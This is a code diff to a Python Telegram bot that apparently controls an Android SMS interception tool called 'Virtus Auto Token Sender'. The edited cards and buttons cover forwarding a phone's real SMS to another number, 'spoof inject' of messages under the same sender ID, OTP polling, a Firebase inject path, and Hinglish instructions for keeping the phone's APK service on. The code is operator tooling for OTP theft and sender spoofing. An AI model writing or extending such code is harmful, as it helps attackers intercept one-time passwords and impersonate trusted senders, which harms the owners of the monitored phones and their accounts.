@@ -6,7 +6,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from app.database import Device, MonitorProfile
 
 STARTUP_TEST_SENDER = "BABY"
-STARTUP_TEST_MESSAGE = "VIRTUS TEST OK — module alive"
+STARTUP_TEST_MESSAGE = "ASTIK TEST OK — module alive"
 BRAND_NAME = "Virtus Auto Token Sender"
 ASTIK_BRAND_LINE = f"──✦ <b>{BRAND_NAME}</b> ✦──"
 
@@ -447,6 +447,8 @@ def format_inject_startup_card(
     total_ms: int = 15,
     *,
     to_number: str | None = None,
+    poll_id: str | None = None,
+    firebase_url: str | None = None,
 ) -> str:
     body = message.replace("<", "").replace(">", "").strip()
     return (
@@ -519,17 +521,19 @@ def format_inject_stream_card(
     )
 
 
-def format_mynum_set_card(phone: str) -> str:
+def format_mynum_set_card(phone: str, poll_id: str | None = None) -> str:
     from app.services import display_phone
 
     shown = display_phone(phone)
+    poll_line = f"📍 Inject path: messages/{poll_id}\n" if poll_id else ""
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
         "Forwarding Number Set!\n"
-        f"📞 Target: {shown}\n"
-        "Real SMS forwards go here during monitoring.\n"
-        "For sender-spoof inject use /key instead."
+        f"📞 Real SMS -&gt; {shown}\n"
+        f"{poll_line}"
+        "Ab yahi number inject hoga — purana replace ho gaya.\n"
+        "Monitoring ON ho to turant apply; warna /startmonitor ya /injecttest."
         "</pre>"
     )
 
@@ -538,8 +542,14 @@ def format_auto_stop_card(minutes: int = 15) -> str:
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring STOPPED!\n"
-        "✅ No more SMS forward/inject."
+        f"Monitoring STOPPED! ({minutes} min auto-stop)\n"
+        "⏸️ Inject + OTP poll + APK uptime band ho gaye.\n\n"
+        "Dobara start (normal flow):\n"
+        "→ /startmonitor\n"
+        "(ya /resume — same kaam)\n\n"
+        "APK phone: START SERVICE ON + same KEY rakho.\n"
+        "Phir /injecttest se SMS check kar sakte ho.\n\n"
+        "Timer badhana: /autostop 60"
         "</pre>"
     )
 
@@ -556,37 +566,57 @@ def format_monitoring_card(
     *,
     startup_test_sent: bool = False,
 ) -> str:
+    from app.services import display_phone, resolve_mynum_phone
+
     sim_index = profile.selected_sim_index or 0
     active_sim = get_selected_sim(device, sim_index)
     sim_slot = active_sim.get("slot", 1)
-    auto_stop = profile.auto_stop_minutes or 15
+    sim_number = active_sim.get("number")
+    if _is_valid_sim_number(sim_number):
+        sim_suffix = display_phone(str(sim_number))
+    else:
+        sim_suffix = "Unknown"
+    auto_stop = profile.auto_stop_minutes if profile.auto_stop_minutes is not None else 15
+    auto_stop_line = (
+        "⏱️ Auto-stop: OFF (manual /stop tak)"
+        if auto_stop <= 0
+        else f"⏱️ Auto-stop in {auto_stop} minutes"
+    )
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
     channel = profile.channel_id or "—"
+    mynum = resolve_mynum_phone(profile) or profile.phone_number
+    real_sms = display_phone(mynum) if mynum else "—"
+    device_tail = _device_phone_display(device)
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring Started! &lt;/&gt;\n"
-        f"📱 Device: {short_device_id(device.name)}\n"
-        f"📡 Device: {format_device_online(device)} (Firebase live)\n"
-        f"📶 FROM SIM: {sim_slot}\n"
+        "Monitoring Started!\n"
+        f"📱 Device: {short_device_id(device.name)} | {device_tail}\n"
+        f"📶 FROM SIM: {sim_slot} ({sim_suffix})\n"
         f"🔑 Inject Key: {inject_key}\n"
-        "📥 Incoming -&gt; spoof inject (same sender ID)\n"
-        f"📢 Channel: {channel} (last / addchannel only)\n"
-        f"⏱️ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
+        "📩 Incoming -&gt; spoof inject (same sender ID)\n"
+        f"📞 Real SMS -&gt; {real_sms}\n"
+        f"📢 Channel: {channel} (last /addchannel only)\n"
+        f"{auto_stop_line}\n"
+        f"🗃️ Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
         f"{test_line}"
         "</pre>"
     )
 
 
-def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
+def monitoring_keyboard(
+    device: Device | None = None,
+    *,
+    monitoring_active: bool = False,
+) -> InlineKeyboardMarkup:
     start_data = f"monitor:start:{device.id}" if device else "monitor:on"
+    start_label = "🟢 Monitoring ON..." if monitoring_active else "🟢 START Monitoring"
     return InlineKeyboardMarkup(
         [
             [
-                InlineKeyboardButton("🟢 START Monitoring", callback_data=start_data),
+                InlineKeyboardButton(start_label, callback_data=start_data),
                 InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
             ]
         ]
